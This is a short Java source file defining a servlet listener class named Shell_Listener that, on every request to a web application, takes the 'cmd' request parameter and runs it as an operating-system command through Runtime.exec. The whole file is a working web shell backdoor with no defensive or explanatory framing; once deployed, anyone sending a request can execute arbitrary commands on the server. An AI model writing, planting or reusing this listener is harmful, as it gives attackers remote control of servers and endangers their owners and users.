package Listener;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.annotation.WebListener;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;

@WebListener
public class Shell_Listener implements ServletRequestListener {
    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();
        String cmd=request.getParameter("cmd");
        try {
            Runtime.getRuntime().exec(cmd);
        } catch (IOException e) {
            e.printStackTrace();
        }catch (NullPointerException n){
            n.printStackTrace();
        }
    }

    @Override
    public void requestDestroyed(ServletRequestEvent sre) {
    }
}
